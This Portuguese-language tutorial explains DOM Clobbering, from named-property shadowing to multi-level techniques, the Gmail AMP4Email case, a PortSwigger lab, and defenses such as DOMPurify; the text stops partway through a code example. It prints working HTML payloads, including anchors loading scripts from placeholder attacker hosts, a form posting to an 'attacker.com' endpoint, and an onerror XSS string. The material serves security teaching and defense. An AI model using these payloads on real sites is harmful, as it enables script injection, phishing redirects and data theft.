# DOM Clobbering: Uma Análise Aprofundada sobre Mecanismos, Vetores de Ataque e Estratégias de Defesa

## Parte I: Fundamentos e Mecânica do DOM Clobbering

Esta seção inicial estabelece a base conceitual para a compreensão do DOM Clobbering, explorando suas origens, os mecanismos fundamentais que o tornam possível e a razão pela qual essa vulnerabilidade persiste no ecossistema da web moderna.

### Seção 1.1: Introdução ao DOM Clobbering: A Vulnerabilidade Sem Script

O DOM Clobbering é uma técnica de ataque de injeção sofisticada e muitas vezes mal compreendida que se enquadra na categoria de ataques "sem código" (*code-less*) ou de reutilização de código. Diferentemente do Cross-Site Scripting (XSS) tradicional, onde o objetivo do invasor é injetar e executar tags `<script>` maliciosas, o DOM Clobbering opera de forma mais sutil. O ataque consiste em injetar marcações HTML aparentemente benignas e sem scripts — como âncoras (`<a>`), formulários (`<form>`) ou imagens (`<img>`) — em uma página web com o objetivo de manipular o *Document Object Model* (DOM) de uma forma que influencie ou altere o comportamento do código JavaScript já existente na página. Ao fazer isso, um invasor habilidoso pode corromper o estado da aplicação, contornar a lógica de segurança e, em última análise, escalar seus privilégios para alcançar consequências graves, como redirecionamentos abertos, *Cross-Site Request Forgery* (CSRF) e até mesmo a execução de código arbitrário.

A existência do DOM Clobbering é um sintoma de um problema mais profundo e antigo na web: o legado de comportamentos de navegadores criados por conveniência em uma era anterior à padronização rigorosa das APIs da web. Nos primórdios da internet, para facilitar o desenvolvimento, os navegadores introduziram atalhos que permitiam aos desenvolvedores acessar elementos HTML diretamente no JavaScript através de seus nomes ou IDs, sem a necessidade de chamadas explícitas a funções como `document.getElementById()`. Por exemplo, um campo de formulário com `name="username"` dentro de um formulário com `id="loginForm"` poderia ser acessado simplesmente como `loginForm.username`. Essa funcionalidade, embora conveniente, criou uma ponte direta e perigosa entre o espaço de nomes do DOM e o espaço de nomes global do JavaScript.

O cerne do problema reside na colisão de *namespaces* que essa ponte permite. Quando um navegador processa uma página HTML, ele pode criar automaticamente propriedades globais nos objetos `window` e `document` para cada elemento que possui um atributo `id` e, para certos tipos de elementos, um atributo `name`. Se uma variável ou função JavaScript no escopo global tiver o mesmo nome que um desses atributos `id` ou `name`, o navegador, em certas condições, "sobrescreverá" (*clobber*) a referência JavaScript com um ponteiro para o elemento do DOM. Esse comportamento é a pedra angular de todos os ataques de DOM Clobbering.

Isso nos leva a uma observação fundamental sobre a natureza persistente desta vulnerabilidade. A existência do DOM Clobbering é conhecida pela comunidade de segurança há mais de uma década, com as primeiras demonstrações datando de pelo menos 2010. A solução mais direta e eficaz seria desativar completamente esse mecanismo de acesso a propriedades nomeadas no nível do navegador. No entanto, propostas nesse sentido foram repetidamente rejeitadas. A razão para isso é que, apesar de ser uma falha de segurança, esse comportamento legado ainda é amplamente utilizado por uma vasta quantidade de sites legítimos na internet. Dados de telemetria do Google Chrome em 2021 revelaram que mais de 10% da web depende dessas funcionalidades, e desativá-las causaria uma quebra em massa de sites funcionais.

A inviabilidade de uma correção no nível do navegador cria uma tensão duradoura entre a necessidade de manter a compatibilidade com o passado e o desejo de construir uma web mais segura. Essa tensão transfere o ônus da mitigação inteiramente para os ombros dos desenvolvedores de aplicações. Eles são forçados a entender as nuances desse comportamento arcaico e a implementar defesas em camadas, que são inerentemente mais complexas e, como será discutido mais adiante, muitas vezes incompletas ou falhas. Consequentemente, o DOM Clobbering não é apenas uma vulnerabilidade de programação; é um problema sistêmico do ecossistema da web, garantindo que ele permaneça uma ameaça relevante e um campo fértil para pesquisa de segurança por muitos anos.

### Seção 1.2: O Mecanismo Central de Sobrescrita (*Clobbering*)

Para explorar o DOM Clobbering, é essencial compreender o mecanismo preciso pelo qual um elemento HTML pode sobrescrever uma variável JavaScript. Esse processo é governado por um comportamento do navegador conhecido como "acesso a propriedades nomeadas" (*named property access*). De acordo com as especificações HTML, quando um navegador constrói o DOM de uma página, ele não apenas cria a árvore de nós, mas também popula os objetos globais `window` e `document` com referências a elementos que possuem atributos de nomeação.

Especificamente, qualquer elemento HTML com um atributo `id` não vazio pode criar uma propriedade no objeto `window` com o mesmo nome do `id`. Por exemplo, uma tag `<div id="config"></div>` fará com que `window.config` (e, portanto, a variável global `config`) aponte para esse elemento `div`. Além do `id`, um conjunto mais restrito de elementos — `<a>`, `<embed>`, `<form>`, `<iframe>`, `<img>`, `<object>` — também pode criar essas propriedades globais usando o atributo `name`.

Esse mecanismo se torna explorável em conjunto com um padrão de codificação muito comum em JavaScript, especialmente em código mais antigo, que visa inicializar um objeto de configuração com um valor padrão se ele ainda não existir:

```javascript
var config = window.config || { url: '/default.js' };
```

Este padrão é a porta de entrada clássica para um ataque de DOM Clobbering. O operador de OU lógico (`||`) é o ponto fraco. A lógica do desenvolvedor assume que `window.config` será `undefined` se não tiver sido explicitamente definido no código, fazendo com que a expressão avalie para o objeto padrão `{ url: '/default.js' }`. No entanto, um invasor que possa injetar HTML na página pode subverter essa lógica. Ao injetar uma simples tag como `<a id="config"></a>`, o cenário muda drasticamente:

1. O navegador processa o HTML injetado e cria a propriedade `window.config`.
2. Agora, `window.config` não é mais `undefined`. Em vez disso, ele contém uma referência ao elemento `<a>`.
3. Quando o script JavaScript é executado, a expressão `window.config || ...` é avaliada. Como `window.config` é agora um objeto (o nó do DOM), ele é considerado "truthy".
4. Consequentemente, a variável `config` recebe o elemento `<a>` em vez do objeto de configuração esperado.
5. Qualquer código subsequente que tente acessar propriedades de `config`, como `config.url`, irá interagir com o elemento do DOM, não com o objeto JavaScript, abrindo a porta para a manipulação por parte do invasor.

Um aspecto ainda mais perigoso desse mecanismo é a precedência e o sombreamento (*shadowing*). A ordem em que os navegadores resolvem os nomes das propriedades é crucial. O acesso a propriedades nomeadas do DOM tem uma precedência surpreendentemente alta, o que significa que uma propriedade criada por um elemento HTML pode "sombrear" (*overshadow*) propriedades e APIs legítimas que já existem nos objetos `window` ou `document`. Isso inclui a capacidade de sobrescrever funções nativas e essenciais, como `document.getElementById` ou `document.querySelector`.

Por exemplo, se um invasor injetar `<form id="getElementById"></form>`, qualquer chamada subsequente a `document.getElementById(...)` não invocará a função nativa do navegador. Em vez disso, tentará acessar a propriedade `getElementById` do objeto `document`, que agora aponta para o elemento `<form>`. Como um elemento de formulário não é uma função, isso resultará em um `TypeError`, quebrando a funcionalidade da página ou, pior, sendo explorado para contornar a lógica de segurança.

Este mecanismo de sombreamento é o que permite que o DOM Clobbering evolua de uma simples manipulação de variáveis de configuração para uma ferramenta poderosa de *bypass* de segurança. Considere um sanitizador de HTML do lado do cliente que tenta remover atributos perigosos de um formulário. A lógica do sanitizador pode ser algo como `for (const attr of formElement.attributes) {... }`. Se um invasor puder injetar um `<input id="attributes">` dentro do formulário que está sendo sanitizado, ele pode *clobber* a propriedade `formElement.attributes`. O sanitizador, ao tentar acessar `formElement.attributes`, não obterá a coleção de atributos nativa, mas sim o elemento `<input>`. A tentativa de iterar sobre um elemento de *input* falhará silenciosamente ou lançará um erro, fazendo com que o processo de sanitização seja pulado e permitindo que atributos maliciosos (como `onclick`) permaneçam intactos. O ataque não visa a lógica do sanitizador diretamente, mas sim as ferramentas fundamentais do DOM que a lógica pressupõe serem seguras e imutáveis.

## Parte II: Técnicas Avançadas de Manipulação do DOM

Uma vez que os fundamentos do DOM Clobbering são compreendidos, os invasores podem empregar técnicas mais avançadas para ir além da simples sobrescrita de uma variável global. Esta seção explora métodos para construir objetos JavaScript complexos e aninhados usando apenas HTML, bem como controlar os tipos de dados e valores dessas propriedades sobrescritas, permitindo ataques muito mais direcionados e eficazes.

### Seção 2.1: Clobbering de Propriedades de Objetos (Multi-nível)

Ataques sofisticados frequentemente exigem a manipulação de propriedades aninhadas, como `config.user.isAdmin`. Para alcançar essa profundidade, os invasores desenvolveram várias técnicas que exploram as relações hierárquicas e de coleção dentro do DOM.

#### Técnica 1: Hierarquia de `<form>`

O elemento `<form>` possui um comportamento especial e poderoso que o torna um dos *gadgets* mais úteis para o DOM Clobbering de múltiplos níveis. Qualquer elemento de controle de formulário (`<input>`, `<textarea>`, `<button>`, `<output>`, etc.) que esteja aninhado dentro de um `<form>` e possua um atributo `name` se torna uma propriedade acessível diretamente no objeto DOM do formulário. Isso permite a construção natural de um *clobbering* de dois níveis.

Por exemplo, considere o seguinte código JavaScript que espera um objeto de configuração com uma propriedade aninhada:

```javascript
var appConfig = window.appConfig || {};
if (appConfig.security.useStrict) {
    // Ativar modo de segurança
}
```

Um invasor pode criar um objeto `appConfig` com uma propriedade `security` usando o seguinte *payload* HTML:

```html
<form id="appConfig">
  <input name="security">
</form>
```

Neste caso, `window.appConfig` se torna o elemento `<form>`. Acessar `appConfig.security` então retorna o elemento `<input>`. O resultado da condição `if` será "truthy", alterando o fluxo do programa.

#### Técnica 2: HTMLCollection com IDs Duplicados

Outra técnica poderosa para alcançar o *clobbering* de dois níveis envolve o uso de IDs duplicados. Quando múltiplos elementos na página compartilham o mesmo atributo `id`, uma chamada a `window.idDoElemento` não retorna um único elemento, mas sim um `HTMLCollection`. Um `HTMLCollection` é um objeto semelhante a um *array* que agrupa todos os elementos com o ID correspondente. Crucialmente, os itens dentro desta coleção podem ser acessados não apenas por seu índice numérico (ex: `colecao[0]`), mas também pelo valor do atributo `name` de um dos elementos contidos.

Isso permite a um invasor criar um objeto e, em seguida, definir uma de suas propriedades. Suponha que o código vulnerável seja:

```javascript
var config = window.config || {};
var script = document.createElement('script');
script.src = config.apiUrl;
document.body.appendChild(script);
```

O invasor pode *clobber* `config` e sua propriedade `apiUrl` com o seguinte *payload*:

```html
<a id="config"></a>
<a id="config" name="apiUrl" href="//malicious-site.com/payload.js"></a>
```

Aqui, `window.config` se torna um `HTMLCollection` contendo as duas âncoras. A expressão `config.apiUrl` acessa o segundo elemento `<a>` através de seu atributo `name`, e o valor resultante usado em `script.src` será o `href` malicioso.

#### Técnica 3: Clobbering de Três ou Mais Níveis

Combinando as duas técnicas anteriores, é possível alcançar profundidades de *clobbering* ainda maiores. Um invasor pode criar uma `HTMLCollection` de elementos `<form>`, permitindo três ou mais níveis de acesso a propriedades.

Considere um código que acessa `configs.production.apiKey`. Um invasor pode construir essa estrutura da seguinte forma:

```html
<form id="configs"></form>
<form id="configs" name="production">
  <input name="apiKey" value="CLOBBERED_VALUE">
</form>
```

A análise passo a passo deste *payload* é:

1. `window.configs` se torna um `HTMLCollection` por causa dos IDs duplicados.
2. `configs.production` acessa o segundo formulário dentro da coleção através de seu atributo `name`.
3. `configs.production.apiKey` acessa o elemento `<input>` dentro do segundo formulário através de seu atributo `name`.
4. O valor final pode ser lido através da propriedade `.value` do *input*.

#### Técnica 4: O Uso de `<iframe>` para Níveis Infinitos

A técnica mais avançada para *clobbering* profundo envolve o uso de `<iframe>`s. Quando um `<iframe>` é criado com um atributo `name`, uma propriedade com esse nome é criada no objeto `window` da página pai. Essa propriedade aponta para o objeto `window` do próprio `<iframe>`. Isso permite que um invasor crie um novo escopo de `window` aninhado, no qual ele pode novamente injetar HTML para *clobber* variáveis. Ao aninhar `<iframe>`s uns dentro dos outros, é teoricamente possível criar uma cadeia de *clobbering* de profundidade ilimitada, embora na prática isso seja limitado por restrições de *parsing* e pela complexidade do *payload*.

### Seção 2.2: Construindo Payloads Eficazes: Controle de Tipo e Valor

Simplesmente sobrescrever uma variável com um elemento do DOM muitas vezes não é suficiente. O código-alvo pode esperar um tipo de dado específico (como uma *string* ou um número) ou um valor específico.

#### O Problema da Conversão para String (`toString()`)

Um dos maiores obstáculos para os invasores é que a maioria dos elementos do DOM, quando usada em um contexto que exige uma *string* (por exemplo, atribuindo a `element.src`), é convertida para a *string* literal `[object HTML...Element]` ou similar. Este valor é geralmente inútil para um ataque que precisa fornecer uma URL ou outro valor de *string* controlável.

#### A Solução: Tags `<a>` e `<base>`

Felizmente para os invasores (e infelizmente para os desenvolvedores), existem duas exceções notáveis a essa regra: as tags `<a>` (âncora) e `<base>`. Quando um objeto representando um desses elementos é convertido para uma *string*, o navegador não retorna `[object HTML...Element]`. Em vez disso, ele retorna o valor processado do atributo `href` do elemento. Isso concede ao invasor controle total sobre o valor da *string* que será usada pelo código vulnerável.

Por exemplo, no ataque de *clobbering* de `script.src` mencionado anteriormente, o uso de uma tag `<a>` com um atributo `href` é o que torna o ataque viável:

```html
<a id="config" href="https://malicious.com/script.js"></a>
```

Quando o código executa `script.src = config`, o objeto `<a>` é convertido para *string*, resultando na URL maliciosa.

#### Controlando Propriedades Específicas

Em cenários onde o código-alvo acessa uma propriedade específica de um objeto, como `.value`, o invasor deve escolher a tag HTML apropriada. As tags `<input>`, `<output>` e `<textarea>` são ideais para isso, pois seus valores podem ser definidos diretamente no HTML através do atributo `value`.

Por exemplo, para *clobber* `options.value`, o *payload* seria:

```html
<form id="options">
  <output name="value">Conteúdo Sobrescrito</output>
</form>
```

Quando o código acessar `options.value`, ele receberá a *string* "Conteúdo Sobrescrito".

**Tabela: Técnicas de DOM Clobbering**

| Técnica | Payload de Exemplo | Profundidade Máxima | Tags/Atributos Chave | Notas / Caso de Uso Ideal |
|---------|--------------------|---------------------|----------------------|---------------------------|
| Clobbering de Nível Único | `<a id="globalVar" href="valor_controlado"></a>` | 1 | `id`, `a`, `href` | Ideal para sobrescrever uma variável global simples que é usada como uma *string* (ex: URL). |
| Hierarquia de `<form>` | `<form id="obj"><input name="prop" value="valor"></form>` | 2 | `form`, `input`, `id`, `name`, `value` | Ideal para sobrescrever uma propriedade de um objeto (`obj.prop`), especialmente quando a propriedade `.value` é acessada. |
| HTMLCollection | `<a id="obj"></a><a id="obj" name="prop" href="valor"></a>` | 2 | `id` (duplicado), `name`, `a`, `href` | Técnica versátil para sobrescrever `obj.prop`. Particularmente útil quando a propriedade precisa ser uma *string* controlável. |
| Combinação de Técnicas | `<form id="x"></form><form id="x" name="y"><input name="z"></form>` | 3 | `form`, `input`, `id` (duplicado), `name` | Permite atingir profundidades maiores (`x.y.z`), necessário para explorar lógicas de aplicação mais complexas. |
| Aninhamento de `<iframe>` | `<iframe name="level1" srcdoc="<a id=level2></a>"></iframe>` | N | `iframe`, `name`, `srcdoc` | Tecnicamente permite profundidade infinita (`level1.level2...`), mas é complexo de construir e pode ser limitado pelo navegador. |

## Parte III: Vetores de Ataque e Impacto no Mundo Real

A teoria por trás do DOM Clobbering é fascinante, mas seu verdadeiro perigo reside em como essas técnicas de manipulação do DOM podem ser traduzidas em vulnerabilidades de alto impacto em aplicações do mundo real. Esta seção conecta a mecânica do *clobbering* a vetores de ataque concretos, demonstrando como ele pode ser escalado para *Cross-Site Scripting* (XSS), *Cross-Site Request Forgery* (CSRF) e outros *bypasses* de segurança.

### Seção 3.1: Escalada para *Cross-Site Scripting* (XSS)

O DOM Clobbering se torna um vetor potente para XSS quando a variável ou propriedade do objeto que foi sobrescrita é posteriormente utilizada em um "*sink*" perigoso. Um *sink* é uma função ou propriedade do DOM que pode executar código ou renderizar HTML se receber dados maliciosos. Exemplos clássicos de *sinks* de XSS incluem `element.innerHTML`, `document.write()`, `script.src`, e o infame `eval()`. O ataque de *clobbering* atua como um canal para entregar um *payload* a um desses *sinks*, muitas vezes contornando filtros que esperariam uma injeção de `<script>` direta.

#### Estudo de Caso 1: Sobrescrevendo `script.src`

Este é um dos cenários mais diretos para escalar o DOM Clobbering para XSS. Ocorre quando uma aplicação constrói dinamicamente uma tag de *script* e usa uma variável de configuração global para definir sua fonte.

**Código Vulnerável:**

```javascript
var config = window.config || { url: 'safe-library.js' };
var s = document.createElement('script');
s.src = config.url;
document.body.appendChild(s);
```

**Payload de Exploração:**

```html
<a id="config"></a>
<a id="config" name="url" href="//attacker-controlled.com/malicious.js"></a>
```

**Análise do Ataque:**

1. O invasor injeta o *payload* HTML em uma parte da página que permite a inserção de tags `<a>` (por exemplo, um campo de comentário ou um perfil de usuário).
2. O navegador cria um `HTMLCollection` chamado `config` porque existem duas âncoras com o mesmo `id`.
3. Quando o JavaScript é executado, a variável `config` recebe a `HTMLCollection`.
4. A linha `s.src = config.url;` é o ponto crítico. O acesso à propriedade `url` na `HTMLCollection` seleciona a segunda âncora através de seu atributo `name`.
5. O objeto da âncora é então convertido para uma *string* para ser atribuído a `s.src`. Como discutido anteriormente, a conversão `toString()` de uma tag `<a>` retorna seu atributo `href`.
6. O resultado é que a página tenta carregar e executar um *script* do domínio do invasor, resultando em uma execução de código arbitrária no contexto da página da vítima.

#### Estudo de Caso 2: O Ataque ao AMP4Email do Gmail

Um dos exemplos mais notáveis de DOM Clobbering no mundo real foi a vulnerabilidade de XSS encontrada no AMP4Email do Gmail em 2019. Este caso é particularmente instrutivo porque demonstra como o *clobbering* pode contornar defesas de segurança extremamente robustas.

**Contexto:** O AMP4Email foi projetado para permitir conteúdo dinâmico em e-mails, mas com um ambiente de segurança muito restrito. Um validador rigoroso impedia o uso da maioria das tags e atributos HTML, e a execução de JavaScript arbitrário era, em teoria, impossível.

**Vulnerabilidade:** O pesquisador de segurança Michał Bentkowski descobriu que, embora muitas tags fossem proibidas, ele ainda podia injetar HTML com atributos `id`. Ele percebeu que o *framework* AMP dependia de várias variáveis de configuração globais para seu funcionamento.

**Técnica de Ataque:** O ataque não foi trivial. O pesquisador teve que superar várias camadas de defesa. Por exemplo, o validador do AMP proibia explicitamente IDs que correspondessem a nomes de variáveis de configuração óbvios, como `id="AMP"`. Para contornar isso, ele teve que encontrar *gadgets* de *clobbering* mais profundos — ou seja, propriedades aninhadas em objetos de configuração que não eram diretamente verificadas. Usando as técnicas de *clobbering* de múltiplos níveis (como `HTMLCollection`), ele conseguiu sobrescrever uma propriedade de configuração aninhada que, eventualmente, era usada de forma insegura por uma função interna do *framework* AMP, levando à execução de JavaScript.

**Implicação Crítica:** Este caso de estudo demonstra uma verdade fundamental sobre a segurança de aplicações modernas: a complexidade é inimiga da segurança. Mesmo em um ambiente *sandboxed* como o AMP4Email, onde o XSS tradicional é bloqueado na porta de entrada, o DOM Clobbering pode fornecer uma porta dos fundos. Ele explora as interações complexas e muitas vezes imprevistas entre o código do próprio *framework* de segurança e o comportamento legado do DOM. A superfície de ataque se desloca da entrada do usuário para a própria lógica interna da aplicação.

#### Laboratório Prático: Exploração de XSS via Clobbering (Baseado em PortSwigger)

A plataforma *Web Security Academy* da PortSwigger fornece um laboratório que simula um cenário de XSS via DOM Clobbering em uma função de comentários de blog.

**Cenário:** A aplicação de blog usa a biblioteca DOMPurify para sanitizar os comentários dos usuários, o que deve prevenir XSS. No entanto, o código JavaScript da página contém o seguinte padrão vulnerável:

```javascript
let defaultAvatar = window.defaultAvatar || { avatar: '/resources/images/avatarDefault.svg' };
// ... mais tarde, o valor de defaultAvatar.avatar é usado para construir uma tag de imagem.
```

**Payload de Exploração:**

```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
```

**Análise Passo a Passo do Ataque:**

1. O invasor submete o *payload* como um comentário. O DOMPurify é invocado para sanitizar o HTML.
2. O *payload* explora uma peculiaridade em versões mais antigas ou configurações específicas do DOMPurify que permitem o protocolo `cid:`. Crucialmente, este protocolo não realiza a codificação de URL em aspas duplas (`"`).
3. O *payload* usa `&quot;` (a entidade HTML para aspas duplas), que será decodificada pelo navegador em tempo de execução, mas pode passar pelo sanitizador.
4. Após a sanitização (que pode falhar em remover o *payload* perigoso), o HTML é inserido na página.
5. O navegador cria a `HTMLCollection` `defaultAvatar`.
6. O código JavaScript da página é executado. A variável `defaultAvatar` é *clobbered* pela `HTMLCollection`.
7. Quando um segundo comentário é postado ou a página é recarregada, a lógica da aplicação tenta exibir o *avatar* do usuário. Ela acessa `defaultAvatar.avatar`.
8. Isso retorna a segunda âncora, que é convertida para seu `href`: `cid:"onerror=alert(1)//`.
9. Este valor é inserido em um atributo `src` de uma tag de imagem, resultando em algo como `<img src="cid:"onerror=alert(1)//">`. A aspa dupla injetada quebra o atributo `src`, permitindo a injeção de um novo atributo, o manipulador de eventos `onerror`.
10. O navegador tenta carregar a imagem, falha, e executa o código no `onerror`, disparando o `alert(1)` e confirmando o XSS.

### Seção 3.2: Vetores de Ataque Além do XSS

Embora o XSS seja frequentemente o objetivo final, o DOM Clobbering é uma técnica versátil que pode levar a uma variedade de outros ataques, dependendo do que a variável sobrescrita controla na aplicação.

#### Open Redirection

Um redirecionamento aberto ocorre quando uma aplicação redireciona um usuário para uma URL fornecida externamente sem validação adequada. O DOM Clobbering pode facilitar este ataque se a URL de destino for controlada por uma variável global.

**Código Vulnerável:**

```javascript
let targetUrl = window.redirectTo || '/dashboard';
location.assign(targetUrl);
```

**Payload de Exploração:**

```html
<a id="redirectTo" href="https://malicious-phishing-site.com"></a>
```

Ao injetar esta âncora, um invasor pode fazer com que qualquer usuário que visite a página vulnerável seja imediatamente redirecionado para um site de *phishing*. O perigo é que o link inicial pode parecer legítimo (apontando para o domínio confiável), mas a navegação subsequente é maliciosa.

#### *Client-Side Request Forgery* (CSRF)

O CSRF é um ataque que força um usuário autenticado a executar ações indesejadas em uma aplicação web. As defesas modernas contra CSRF, especialmente em *Single-Page Applications* (SPAs), muitas vezes dependem de JavaScript do lado do cliente para anexar um *token* anti-CSRF a cada requisição que modifica o estado (ex: POST, PUT, DELETE). O DOM Clobbering pode ser usado para sabotar essa lógica de proteção.

**Mecanismo de Ataque:**

Imagine uma SPA que implementa a defesa "*Double Submit Cookie*". O servidor define um *token* anti-CSRF em um *cookie* que pode ser lido por JavaScript. O código do cliente é responsável por ler este *token* do *cookie* e adicioná-lo como um cabeçalho HTTP customizado (ex: `X-CSRF-Token`) a todas as requisições AJAX. O servidor então valida se o cabeçalho corresponde ao *cookie*.

**Exemplo Teórico de Exploração:**

Suponha que o código do cliente para enviar um pagamento se pareça com isto:

```javascript
function submitPayment() {
    let form = window.payment_form; // Acessa o formulário de pagamento
    let token = getCsrfTokenFromCookie();
    // Código para adicionar o token ao formulário ou como cabeçalho
    form.submit(); // Envia o formulário
}
```

Um invasor pode *clobber* a variável `window.payment_form`. Se ele puder injetar o seguinte HTML:

```html
<form id="payment_form" action="https://attacker.com/steal_credentials" method="POST">
  <input name="amount" value="9999">
</form>
```

Quando a função `submitPayment` for chamada, ela irá operar no formulário malicioso do invasor. O *script* pode até mesmo adicionar o *token* CSRF legítimo ao formulário do invasor, mas isso não importa, pois o formulário será submetido ao domínio do invasor, não ao servidor da aplicação. O ataque não quebra a criptografia do *token*, mas sim desvia a lógica do cliente que deveria usá-lo para proteger a requisição.

#### *Bypass* de Lógica de Segurança (*Sanitizer Bypass*)

Como visto brevemente na Parte I, o DOM Clobbering é uma ferramenta excepcional para contornar a lógica de segurança do lado do cliente, como os sanitizadores de HTML.

**Mecanismo de Ataque:**

Muitos sanitizadores de cliente funcionam percorrendo a árvore do DOM de uma *string* de HTML "suja" e removendo elementos ou atributos perigosos. Essa lógica depende fundamentalmente da integridade das APIs do DOM que ela utiliza para a travessia e manipulação, como `element.attributes`, `element.children`, `node.removeChild()`, etc.

**Payload de Exploração:**

```html
<form onclick="alert('Sanitizer Bypassed!')">
  <input id="attributes">
</form>
```

**Análise do *Bypass*:**

1. O sanitizador recebe o HTML e o analisa em uma árvore do DOM.
2. Ele encontra o elemento `<form>` e, como `<form>` é geralmente permitido, ele prossegue para verificar seus atributos.
3. A lógica do sanitizador tenta iterar sobre a coleção de atributos do formulário acessando a propriedade `form.attributes`.
4. No entanto, esta propriedade foi *clobbered* pelo elemento `<input>` aninhado com `id="attributes"`.
5. O sanitizador agora tenta iterar sobre o elemento `<input>` em vez da coleção de atributos real. Um elemento de *input* não tem uma propriedade `.length` da mesma forma que uma coleção, ou a iteração sobre ele não funciona como o esperado.
6. O loop de sanitização falha ou é pulado, e o atributo `onclick` malicioso no elemento `<form>` nunca é removido.
7. O HTML "limpo" é retornado com o *payload* intacto, pronto para ser acionado por uma interação do usuário.

Este tipo de ataque é particularmente insidioso porque a vulnerabilidade não está no sanitizador em si, mas na interação imprevista entre o sanitizador e o comportamento de *clobbering* do DOM.

## Parte IV: Estratégias de Defesa em Profundidade

Dado que o DOM Clobbering explora um comportamento fundamental e legado dos navegadores que não pode ser simplesmente desativado, a defesa eficaz requer uma abordagem em camadas. Nenhuma técnica isolada é uma bala de prata. Esta seção detalha um conjunto de estratégias de defesa, desde práticas de codificação segura no código-fonte até o uso de ferramentas de sanitização e políticas de segurança, avaliando criticamente a eficácia e as limitações de cada uma.

### Seção 4.1: Práticas de Codificação Segura e Mitigações no Código-Fonte

A primeira linha de defesa contra o DOM Clobbering começa no próprio código da aplicação. Adotar padrões de codificação defensivos pode eliminar muitas das oportunidades de baixo nível que os invasores procuram.

#### Declaração Explícita de Variáveis

Uma das regras mais básicas e eficazes é sempre declarar variáveis usando `const`, `let` ou `var`. Uma atribuição a uma variável não declarada (ex: `minhaVariavel = 'valor'`) pode acidentalmente criar uma propriedade no objeto global `window`, tornando-a um alvo para *clobbering*. O uso de declaradores como `let` e `const` limita o escopo da variável ao bloco em que foi declarada, prevenindo a poluição do *namespace* global e tornando o *clobbering* de variáveis já inicializadas impossível.

#### Evitar Padrões Perigosos

O padrão `var x = window.x || {};` é o principal culpado em muitas vulnerabilidades de DOM Clobbering. Ele deve ser evitado a todo custo. Uma alternativa muito mais segura é verificar explicitamente o tipo da variável antes de usá-la:

```javascript
var x;
if (typeof window.x === 'object' && window.x !== null) {
    x = window.x;
} else {
    x = {};
}
```

Esta abordagem é mais verbosa, mas garante que `window.x` seja um objeto JavaScript real, e não um nó do DOM injetado.

#### `Object.freeze()`

A função `Object.freeze()` do JavaScript pode ser usada para tornar um objeto imutável. Uma vez que um objeto é "congelado", suas propriedades existentes não podem ser alteradas ou removidas, e novas propriedades não podem ser adicionadas. Aplicar `Object.freeze()` a um objeto de configuração global sensível pode, em teoria, prevenir que ele seja sobrescrito por um elemento do DOM.

```javascript
window.myConfig = {
    apiUrl: 'https://api.example.com',
    featureFlags: { newUi: true }
};
Object.freeze(window.myConfig);
Object.freeze(window.myConfig.featureFlags); // Necessário para congelamento profundo
```

No entanto, o uso de `Object.freeze()` como uma defesa primária contra DOM Clobbering enfrenta desafios significativos e limitações:

- **Escopo Superficial:** `Object.freeze()` é uma operação superficial (*shallow*). Ele apenas congela as propriedades diretas do objeto. Se uma dessas propriedades for outro objeto (como `featureFlags` no exemplo acima), esse objeto aninhado permanecerá mutável. Para uma proteção completa, é necessário implementar uma função de "congelamento profundo" (*deep freeze*) que percorra recursivamente toda a estrutura do objeto, o que pode ser complexo e introduzir o risco de loops infinitos se houver referências circulares no objeto.
- **Praticidade e Manutenibilidade:** Em uma aplicação de grande escala, identificar todos os objetos globais sensíveis que precisam ser congelados é uma tarefa árdua e propensa a erros. Os desenvolvedores descrevem essa abordagem como "dolorosa" e difícil de manter à medida que a aplicação evolui.
- **Ineficácia Contra Certos Vetores:** A limitação mais crítica é que `Object.freeze()` é ineficaz quando o alvo do *clobbering* é uma API nativa do navegador ou uma propriedade de um objeto que não se pode congelar, como `window` ou `document`. Tentar executar `Object.freeze(document)` quebraria a funcionalidade da página. Pesquisas acadêmicas demonstraram que aproximadamente 21% das vulnerabilidades de DOM Clobbering encontradas na prática não podem ser mitigadas usando `Object.freeze()` porque exploram APIs nativas.

#### Verificação de Tipo (*Type Checking*)

Uma prática defensiva robusta é nunca confiar no tipo de uma variável global. Antes de usar uma variável que possa ser um alvo de *clobbering*, verifique seu tipo explicitamente. Isso é especialmente importante se a variável for usada em uma operação sensível.

```javascript
// Antes de usar a variável 'config'
if (config instanceof Element) {
    // A variável foi clobbered! Lidar com o erro.
    console.error('DOM Clobbering detectado na variável config.');
    return;
}
// Se a verificação passar, é mais seguro usar 'config'
let url = config.url;
```

Essa verificação garante que a variável não é um nó do DOM antes de prosseguir.

### Seção 4.2: Sanitização de HTML como Linha de Frente

Como o DOM Clobbering começa com a injeção de HTML, uma das defesas mais importantes é a sanitização robusta de qualquer entrada do usuário que será renderizada como HTML.

#### DOMPurify

DOMPurify é uma biblioteca de sanitização de HTML do lado do cliente amplamente recomendada e testada em batalha. Ela foi projetada especificamente com a consciência de ameaças como XSS e DOM Clobbering.

- **Proteção Padrão:** Por padrão, DOMPurify vem com a opção `SANITIZE_DOM: true`. Esta configuração protege contra o *clobbering* de APIs e propriedades nativas do DOM, como `getElementById` ou `attributes`. Ela faz isso verificando se os atributos `id` ou `name` no HTML de entrada colidem com propriedades existentes no protótipo de `Element` e outros objetos do DOM.
- **Proteção Estendida (Essencial):** A proteção padrão não previne o *clobbering* de variáveis e objetos personalizados definidos pela aplicação (ex: `window.myAppConfig`). Para se defender contra este vetor, é crucial habilitar a opção de configuração `SANITIZE_NAMED_PROPS: true`.

```javascript
import DOMPurify from 'dompurify';
let cleanHtml = DOMPurify.sanitize(dirtyHtml, { SANITIZE_NAMED_PROPS: true });
```

Quando esta opção está ativa, DOMPurify implementa uma técnica de isolamento de *namespace*: ele prefixa todos os atributos `id` e `name` no HTML de entrada com a *string* `user-content-`. Isso quebra a colisão de nomes, impedindo que o HTML injetado sobrescreva as variáveis da aplicação.

- **A Importância da Atualização:** É vital manter o DOMPurify sempre na sua versão mais recente. Como demonstrado pelo *bypass* do protocolo `cid:` no laboratório da PortSwigger, até mesmo as bibliotecas mais robustas podem ter vulnerabilidades que são descobertas e corrigidas ao longo do tempo.

#### Sanitizer API (Nativa do Navegador)

Uma alternativa emergente é a Sanitizer API, uma API nativa do navegador que está sendo padronizada para fornecer funcionalidade de sanitização de HTML embutida.

- **Comportamento Padrão:** É importante notar que, em sua configuração padrão, a Sanitizer API não previne o DOM Clobbering.
- **Configuração Segura:** Para usá-la como defesa, é necessário configurá-la explicitamente para remover os atributos de nomeação que causam o *clobbering*:

```javascript
const sanitizer = new Sanitizer({
    blockAttributes: [ 'id', 'name' ]
});
